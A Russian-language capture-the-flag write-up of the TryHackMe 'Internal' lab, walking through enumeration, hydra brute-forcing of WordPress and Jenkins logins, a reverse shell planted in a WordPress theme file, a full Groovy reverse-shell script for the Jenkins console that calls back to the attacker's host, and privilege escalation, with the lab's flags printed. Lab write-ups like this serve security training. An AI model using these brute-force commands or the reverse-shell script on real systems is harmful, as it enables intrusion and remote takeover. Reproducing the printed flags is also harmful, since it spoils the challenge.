# TryHackMe - Lin Hard - Internal

📅 Дата: 2025-07-09  
🧠 Сложность: Hard  
💻 IP-адрес: 10.10.123.74  

---

## Sugar

```bash
nmap_ctf() {
  local ip=$1
  sudo nmap -sS -p- -Pn --max-parallelism 100 --min-rate 1000 -v -oN nmap-sS.txt $ip && nmap -sT -Pn -sV -T4 -A -v -p "$(grep -oP \"^[0-9]+(?=/tcp\s+open)\" nmap-sS.txt | sort -n | paste -sd \",\")" -oN nmap-sV.txt $ip
}
```


## 🔍 Сканирование

```bash
export ip=10.10.123.74 && nmap_ctf $ip
```

### nmap

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%), Linux 3.2 - 4.9 (93%), Linux 3.7 - 3.10 (93%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 30.812 days (since Mon Jun  9 02:19:09 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=244 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Стартовая страница Apache
![apache](screenshots/01.apache.png)

---

## 🕵️ Enumeration

### ffuf

Ищу директории
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - Internal/scans]
└─$ ffuf -fc 404 -t 100 -w /media/sf_Exchange/Dictionaries/Dir/directory-list-2.3-medium.txt -u http://internal.thm/FUZZ

blog                    [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 5699ms]
wordpress               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 219ms]
javascript              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 219ms]
phpmyadmin              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 216ms]
```

Сайт использует wordpress, запускаю **wpscan**
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - Internal/scans]
└─$ wpscan --url http://internal.thm/wordpress/ -v
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/wordpress/ [10.10.123.74]
[+] Started: Wed Jul  9 21:56:13 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://internal.thm/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/wordpress/wp-content/themes/twentyseventeen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://internal.thm/wordpress/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.9
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a focus on business sites, it features multiple sections on the front page as well as widgets, navigation and social menus, a logo, and more. Personalize its asymmetrical grid with a custom color scheme and showcase your multimedia content with post formats. Our default theme for 2017 works great in many languages, for any abilities, and on any device.
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 | License: GNU General Public License v2 or later
 | License URI: http://www.gnu.org/licenses/gpl-2.0.html
 | Tags: one-column, two-columns, right-sidebar, flexible-header, accessibility-ready, custom-colors, custom-header, custom-menu, custom-logo, editor-style, featured-images, footer-widgets, post-formats, rtl-language-support, sticky-post, theme-options, threaded-comments, translation-ready
 | Text Domain: twentyseventeen
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:11 <====================================> (137 / 137) 100.00% Time: 00:00:11

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Jul  9 21:56:40 2025
[+] Requests Done: 172
[+] Cached Requests: 5
[+] Data Sent: 38.875 KB
[+] Data Received: 359.73 KB
[+] Memory used: 279.887 MB
[+] Elapsed time: 00:00:27
```

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).  
[+] WordPress theme in use: twentyseventeen

Есть пользователь **admin**, пробую сбрутить пароль
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - Internal/scans]
└─$ hydra -l admin -P /media/sf_Exchange/Dictionaries/rockyou.txt -t 40 internal.thm -s 80 http-post-form "/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1:F=is incorrect" 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-09 22:16:29
[DATA] max 40 tasks per 1 server, overall 40 tasks, 14344398 login tries (l:1/p:14344398), ~358610 tries per task
[DATA] attacking http-post-form://internal.thm:80/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1:F=is incorrect
[STATUS] 1560.00 tries/min, 1560 tries in 00:01h, 14342838 to do in 153:15h, 40 active
[80][http-post-form] host: internal.thm   login: admin   password: my2boys                                         
1 of 1 target successfully completed, 1 valid password found                                                       
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-09 22:19:19
```
admin@internal.thm

## 📂 Получение доступа

Захожу в **Appearance -> Theme Editor -> 404.php** и вставляю код reverse shell  
![theme](screenshots/02.theme.png)

Перехожу в несуществующий пост и получаю доступ    
![reverse](screenshots/03.reverse.png)


## ⚙️ Привилегии

Из пользователей есть **aubreanna**
```bash
$ cd home
$ ls -la
total 12
drwxr-xr-x  3 root      root      4096 Aug  3  2020 .
drwxr-xr-x 24 root      root      4096 Aug  3  2020 ..
drwx------  7 aubreanna aubreanna 4096 Aug  3  2020 aubreanna
```

Информация о системе
```bash
$ cat /proc/version
Linux version 4.15.0-112-generic (buildd@lcy01-amd64-027) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020

$ cat /etc/issue
Ubuntu 18.04.4 LTS \n \l
```

brute ssh не дал результатов
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - Internal/scans]
└─$ hydra -l aubreanna -P /media/sf_Exchange/Dictionaries/rockyou.txt -t 40 ssh://internal.thm
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway)
```

Пробую поискать файлы с кредами
```bash
$ grep -Ril "password\|aubreanna" / 2>/dev/null
/opt/wp-save.txt
/proc/kallsyms
```

Захожу под **aubreanna** **bubb13guM!@#123**
```bash
aubreanna@internal:~$ ls -la
total 56
drwx------ 7 aubreanna aubreanna 4096 Aug  3  2020 .
drwxr-xr-x 3 root      root      4096 Aug  3  2020 ..
-rwx------ 1 aubreanna aubreanna    7 Aug  3  2020 .bash_history
-rwx------ 1 aubreanna aubreanna  220 Apr  4  2018 .bash_logout
-rwx------ 1 aubreanna aubreanna 3771 Apr  4  2018 .bashrc
drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .cache
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .gnupg
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .local
-rwx------ 1 root      root       223 Aug  3  2020 .mysql_history
-rwx------ 1 aubreanna aubreanna  807 Apr  4  2018 .profile
drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .ssh
-rwx------ 1 aubreanna aubreanna    0 Aug  3  2020 .sudo_as_admin_successful
-rwx------ 1 aubreanna aubreanna   55 Aug  3  2020 jenkins.txt
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 snap
-rwx------ 1 aubreanna aubreanna   21 Aug  3  2020 user.txt
aubreanna@internal:~$ cat user.txt
THM{int3rna1_fl4g_1}
```

Там же в директории есть файл **jenkins.txt**
```bash
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
```

Осматриваюсь по сетевым интерфейсам
```bash
aubreanna@internal:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:af:fa:5c:b1:81 brd ff:ff:ff:ff:ff:ff
    inet 10.10.123.74/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2442sec preferred_lft 2442sec
    inet6 fe80::af:faff:fe5c:b181/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:15:c8:36:eb brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:15ff:fec8:36eb/64 scope link 
       valid_lft forever preferred_lft forever
5: veth21870e3@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 16:92:9f:dd:c8:8f brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::1492:9fff:fedd:c88f/64 scope link 
       valid_lft forever preferred_lft forever
aubreanna@internal:~$ ss -tunlp
Netid     State        Recv-Q       Send-Q                  Local Address:Port              Peer Address:Port      
udp       UNCONN       0            0                       127.0.0.53%lo:53                     0.0.0.0:*         
udp       UNCONN       0            0                   10.10.123.74%eth0:68                     0.0.0.0:*         
tcp       LISTEN       0            80                          127.0.0.1:3306                   0.0.0.0:*         
tcp       LISTEN       0            128                         127.0.0.1:37423                  0.0.0.0:*         
tcp       LISTEN       0            128                         127.0.0.1:8080                   0.0.0.0:*         
tcp       LISTEN       0            128                     127.0.0.53%lo:53                     0.0.0.0:*         
tcp       LISTEN       0            128                           0.0.0.0:22                     0.0.0.0:*         
tcp       LISTEN       0            128                                 *:80                           *:*         
tcp       LISTEN       0            128                              [::]:22                        [::]:*
```

Пробрасываю **8080** на **9999**, т.к. 8080 у меня занят
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - Internal/scans]
└─$ ssh -f -N -L 9999:localhost:8080 aubreanna@internal.thm
aubreanna@internal.thm's password: 
```

Там встречает Jenkins
![jenkins](screenshots/04.jenkins.png)

Выполняю brute force
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - Internal/scans]
└─$ hydra -l admin -P /media/sf_Exchange/Dictionaries/rockyou.txt -t 40 localhost -s 9999 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=Invalid username or password" -f    
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-10 02:02:45
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 40 tasks per 1 server, overall 40 tasks, 14344398 login tries (l:1/p:14344398), ~358610 tries per task
[DATA] attacking http-post-form://localhost:9999/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=Invalid username or password
[9999][http-post-form] host: localhost   login: admin   password: spongebob
[STATUS] attack finished for localhost (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-10 02:03:12
```

Вхожу с кредами login: `admin`   password: `spongebob`
Перехожу в панель скриптов `http://127.0.0.1:9999/script`
и настраиваю reverse shell
```bash
String host="10.21.104.16";
int port=5555;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();
  po.flush();
  Thread.sleep(50);
  try {
    p.exitValue();break;
  }catch (Exception e){}
};
p.destroy();
s.close();
```
![script](screenshots/05.script.png)

Получаю reverse shell и немного улучшаю его
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - Internal/scans]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.21.104.16] from (UNKNOWN) [10.10.123.74] 35992
id
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
which python3
which python
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/bash")'
jenkins@jenkins:/$
```

Скачиваю и запускаю linpeas
```bash
jenkins@jenkins:/tmp$ ./linpeas.sh
./linpeas.sh
```

Находит файл с кредами
![note](screenshots/06.note.png)
```bash
cat /opt/note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
jenkins@jenkins:/tmp$ 
```

Повышаю привилегии до root
```bash
aubreanna@internal:~$ su root
Password:                                                                                                          
root@internal:/home/aubreanna# id                                                                                  
uid=0(root) gid=0(root) groups=0(root)                                                                             
root@internal:/home/aubreanna# cd /root
root@internal:~# cat root.txt
THM{d0ck3r_d3str0y3r}
root@internal:~# 
```



## 🏁 Флаги

- User flag: THM{int3rna1_fl4g_1} 
- Root flag: THM{d0ck3r_d3str0y3r} 

---
